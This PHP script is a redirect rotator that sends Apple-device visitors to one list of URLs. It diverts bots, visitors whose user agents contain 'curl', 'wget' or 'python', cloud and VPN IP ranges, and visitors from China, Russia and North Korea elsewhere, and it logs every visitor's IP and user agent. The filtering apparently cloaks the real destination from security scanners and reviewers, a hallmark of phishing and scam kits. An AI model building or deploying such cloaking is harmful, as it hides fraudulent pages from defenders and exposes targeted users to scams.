<?php
$config = json_decode(file_get_contents("config.json"), true);
$counterFile = "counter.json";
$counter = file_exists($counterFile) ? json_decode(file_get_contents($counterFile), true) : ['apple' => 0, 'other' => 0];

$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$deviceType = preg_match('/iPhone|iPad|iPod|Macintosh/i', $userAgent) ? 'apple' : 'other';

// === BLOCKER SECTION ===
$botKeywords = ['bot', 'crawl', 'slurp', 'spider', 'curl', 'wget', 'python', 'scrapy'];
foreach ($botKeywords as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        $deviceType = 'other';
        break;
    }
}
$ipinfoToken = '';
$infoUrl = "http://ipinfo.io/{$ip}/json" . ($ipinfoToken ? "?token={$ipinfoToken}" : '');
$ipInfo = @json_decode(@file_get_contents($infoUrl), true);
$org = $ipInfo['org'] ?? '';
$country = $ipInfo['country'] ?? '';
$blockedCountries = ['CN', 'RU', 'KP'];
$vpnKeywords = ['DigitalOcean', 'Amazon', 'OVH', 'Google', 'Hetzner', 'Microsoft', 'VPN', 'Hostinger'];
foreach ($vpnKeywords as $kw) {
    if (stripos($org, $kw) !== false) {
        $deviceType = 'other';
        break;
    }
}
if (in_array($country, $blockedCountries)) {
    $deviceType = 'other';
}

// === LOGGING & REDIRECT ===
$logFile = __DIR__ . '/clicklog.txt';
$timestamp = date('Y-m-d H:i:s');
$logEntry = "$timestamp|$ip|$userAgent|$deviceType" . PHP_EOL;
file_put_contents($logFile, $logEntry, FILE_APPEND);

$urls = $config[$deviceType];
$index = $counter[$deviceType] ?? 0;
$redirectUrl = $urls[$index] ?? $urls[0];
$counter[$deviceType] = ($index + 1) % count($urls);
file_put_contents($counterFile, json_encode($counter));

header("Location: $redirectUrl", true, 302);
exit;
